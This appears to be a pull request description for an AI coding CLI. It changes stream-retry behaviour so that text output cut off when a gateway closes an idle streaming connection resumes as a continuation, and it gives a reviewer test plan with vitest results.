YOLO/headless generation of large outputs fails consistently for thinking models today: the whole think -> tool loop runs as a single SSE stream that outlives the gateway's idle window, the gateway closes the socket, and the session dies with `[API Error: terminated]`. Restarting from zero would also re-print the partial output in headless mode, which is why a plain after-chunk retry was never enabled. The continuation shape reuses the same machinery as the MAX_TOKENS output recovery (recovery message, `isContinuation` retry event, coalescing), so the UI keeps its buffer and the continuation appends seamlessly in both interactive and headless modes. FunctionCall partials still propagate immediately, since a user message cannot be injected between a functionCall and its response.

## Reviewer Test Plan

### How to verify

`npx vitest run src/core/geminiChat.test.ts` in `packages/core`: 242/242 pass. The new tests cover the three relevant shapes: mid-stream socket close with a text partial retries as a continuation (`RETRY` event with `isContinuation: true`, history coalesced to a single model turn holding partial + continuation, no synthetic user turn left behind); a functionCall partial still propagates with no retry attempt; a failed continuation keeps the partial turn and rethrows. The previously existing test that pinned "never retry after a chunk" was updated to the new contract, since that pinned behavior is exactly what #7832 reports as the bug.

### Evidence (Before & After)

N/A (core retry semantics, no UI surface change; the TUI's existing `isContinuation` handling keeps the text buffer, verified by reading `useGeminiStream.ts`'s Retry case).

### Tested on

|     OS     | Status |
| :--------: | :----: |
|  🍏 macOS  |   ✅   |
| 🪟 Windows |   N/A  |
|  🐧 Linux  |   N/A  |
